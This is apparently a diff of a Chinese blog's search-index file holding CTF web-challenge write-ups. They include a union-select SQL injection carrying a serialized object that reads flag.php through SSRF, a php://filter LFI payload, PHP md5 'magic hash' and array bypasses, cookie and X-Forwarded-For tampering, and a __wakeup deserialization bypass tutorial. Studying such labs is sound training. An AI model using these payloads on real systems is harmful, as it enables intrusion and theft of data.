+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
+    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
+&#125;
+&#125;</code></pre>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
+<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
+
+<p>查看源码，解base64。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>unserailize</tag>
       </tags>
   </entry>
   <entry>
@@ -2294,6 +2530,148 @@ urls = re.findall(findlinks, html)
       </tags>
   </entry>
   <entry>
+    <title>nctf</title>
+    <url>/2020/08/29/nctf/</url>
+    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><span id="more"></span>
+
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
+<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
+<p><strong>md5函数漏洞</strong></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
+<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
+<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
+&#125;&#125;
+<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre>
+
+<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>常见的payload有</p>
+<pre><code class="hljs c++">QNKCDZO
+<span class="hljs-number">240610708</span>
+s878926199a
+s155964671a
+s214587387a
+s214587387a
+ sha1(str)
+sha1(&#x27;aaroZmOk&#x27;)  
+sha1(&#x27;aaK1STfY&#x27;)
+sha1(&#x27;aaO8zKZF&#x27;)
+sha1(&#x27;aa3OFF9m&#x27;)</code></pre>
+
+<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
+<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
+<p>再次输入口令即可。</p>
+<p>考点为前端代码修改</p>
+<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
+<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
+<p>在最后发现flag</p>
+<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
+<p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" alt></p>
+<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
+<p>点击发现url改变，跳转到了另一个页面</p>
+<p>bp抓包试试，go一下，相应包中出现flag</p>
+<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
+<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
+<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
+<p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" alt></p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
+<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
+<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
+<p>base64解码</p>
+<pre><code class="hljs php+HTML">&lt;html&gt;
+    &lt;title&gt;asdf&lt;&#x2F;title&gt;
+&lt;?php
+	error_reporting(0);
+	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
+	$file&#x3D;$_GET[&#39;file&#39;];
+	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+		echo &quot;Oh no!&quot;;
+		exit();
+	&#125;
+	include($file); 
+&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
+?&gt;
+&lt;&#x2F;html&gt;</code></pre>
+
+<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
+<p> <strong>TIP: 0==not</strong> </p>
+<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code>   go</p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
+<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据">元数据</a>（Metadata，又称元数据）。</strong></p>
+<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
+<p>查看robots.txt</p>
+<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
+<pre><code class="hljs php">TIP:sql.php
+<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre>
+
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id]) &#123;
+   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  <span class="hljs-variable">$id</span> = intval(<span class="hljs-variable">$_GET</span>[id]);
+  <span class="hljs-variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="hljs-string">&quot;select content from ctf2 where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>));
+  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[id]==<span class="hljs-number">1024</span>) &#123;
+      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;
+  &#125;
+  <span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$query</span>[content]);
+  &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
+<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
+<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
+<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
+<p>想到了intval()函数的作用，尝试id=1024.1</p>
+<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
+<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>])) &#123;
+       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;
+       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)   
+           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
+       <span class="hljs-keyword">else</span>
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;
+   &#125;</code></pre>
+
+<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
+<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
+<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
+&#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])
+<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
+<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
+<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;
+&#125; 
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
+<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
+<p>payload:</p>
+<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
+<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
+<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>md5</tag>
+        <tag>sql</tag>
+        <tag>代码审计</tag>
+        <tag>bypass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nctf-2</title>
     <url>/2020/09/02/nctf-2/</url>
     <content><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><span id="more"></span>
@@ -2477,146 +2855,310 @@ error_reporting(<span class="hljs-number">0</span>);
       </tags>
   </entry>
   <entry>
-    <title>nctf</title>
-    <url>/2020/08/29/nctf/</url>
-    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><span id="more"></span>
+    <title>反序列化</title>
+    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>反序列化</p>
+<span id="more"></span>
+<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
+<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
+<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
+<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
+<p>举例说明</p>
+<pre><code>&lt;?php
+class Student&#123;
+public $full_name = &apos;zhangsan&apos;;
+public $score = 150;
+public $grades = array();
 
-<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
-<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
-<p><strong>md5函数漏洞</strong></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
-<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
-<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
-<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
-&#125; <span class="hljs-keyword">else</span> &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
-&#125;&#125;
-<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre>
-
-<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>常见的payload有</p>
-<pre><code class="hljs c++">QNKCDZO
-<span class="hljs-number">240610708</span>
-s878926199a
-s155964671a
-s214587387a
-s214587387a
- sha1(str)
-sha1(&#x27;aaroZmOk&#x27;)  
-sha1(&#x27;aaK1STfY&#x27;)
-sha1(&#x27;aaO8zKZF&#x27;)
-sha1(&#x27;aa3OFF9m&#x27;)</code></pre>
-
-<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
-<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
-<p>再次输入口令即可。</p>
-<p>考点为前端代码修改</p>
-<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
-<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
-<p>在最后发现flag</p>
-<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
-<p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" alt></p>
-<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
-<p>点击发现url改变，跳转到了另一个页面</p>
-<p>bp抓包试试，go一下，相应包中出现flag</p>
-<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
-<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
-<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
-<p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" alt></p>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
-<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
-<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
-<p>base64解码</p>
-<pre><code class="hljs php+HTML">&lt;html&gt;
-    &lt;title&gt;asdf&lt;&#x2F;title&gt;
-&lt;?php
-	error_reporting(0);
-	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
-	$file&#x3D;$_GET[&#39;file&#39;];
-	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
-		echo &quot;Oh no!&quot;;
-		exit();
-	&#125;
-	include($file); 
-&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
-?&gt;
-&lt;&#x2F;html&gt;</code></pre>
-
-<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
-<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
-<p> <strong>TIP: 0==not</strong> </p>
-<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code>   go</p>
-<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
-<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据">元数据</a>（Metadata，又称元数据）。</strong></p>
-<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
-<p>查看robots.txt</p>
-<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
-<pre><code class="hljs php">TIP:sql.php
-<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre>
-
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id]) &#123;
-   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
-  mysql_select_db(SAE_MYSQL_DB);
-  <span class="hljs-variable">$id</span> = intval(<span class="hljs-variable">$_GET</span>[id]);
-  <span class="hljs-variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="hljs-string">&quot;select content from ctf2 where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>));
-  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[id]==<span class="hljs-number">1024</span>) &#123;
-      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;
-  &#125;
-  <span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$query</span>[content]);
-  &#125;
+function __wakeup() &#123;
+echo &quot;__wakeup is invoked&quot;;
 &#125;
+&#125;
+
+$s = new Student();
+var_dump(serialize($s));
+?&gt;</code></pre><hr>
+<pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code></pre><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
+<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
+<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
+<p>最后执行运行的代码如下:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$full_name</span> = <span class="hljs-string">&#x27;zhangsan&#x27;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$score</span> = <span class="hljs-number">150</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$grades</span> = <span class="hljs-keyword">array</span>();
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup is invoked&quot;</span>;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+var_dump(<span class="hljs-keyword">$this</span>);
+&#125;
+&#125;
+
+<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Student();
+<span class="hljs-variable">$stu</span> = unserialize(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);
 <span class="hljs-meta">?&gt;</span></code></pre>
 
-<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
-<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
-<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
